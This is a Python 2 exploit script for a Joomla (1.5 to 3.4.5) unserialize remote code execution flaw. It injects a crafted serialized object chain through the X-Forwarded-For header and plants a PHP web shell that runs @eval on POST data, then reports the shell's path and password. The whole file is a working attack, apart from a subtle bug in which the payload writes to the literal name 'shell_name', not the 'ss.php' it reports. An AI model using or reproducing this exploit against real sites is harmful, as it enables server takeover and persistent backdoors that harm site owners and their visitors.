# coding=utf-8
# Help: joomla 1.5-3.4.5 unserialize remote code execution

import urllib2
import cookielib,sys,random

def poc(url):
	url = 'http://'+url
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	urllib2.install_opener(opener)
	urllib2.socket.setdefaulttimeout(10)
	shell_name = 'ss.php'
	payload = 'file_put_contents($_SERVER["DOCUMENT_ROOT"].chr(47)."shell_name","\x3C".chr(63)."php @eval(\x5C\x24_POST[x]);")'

	forward = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:' + str(len(payload)+28) + ':"' + payload + ';JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
	req = urllib2.Request(url=url,headers={'x-forwarded-for':forward})
	try:
		opener.open(req)
		req = urllib2.Request(url=url)
		if 'SimplePie_Misc::parse_url' in opener.open(req).read():
		    return 'Shell: '+ url + '/{} Password: x'.format(shell_name)
		return False
	except Exception, e:
	    return False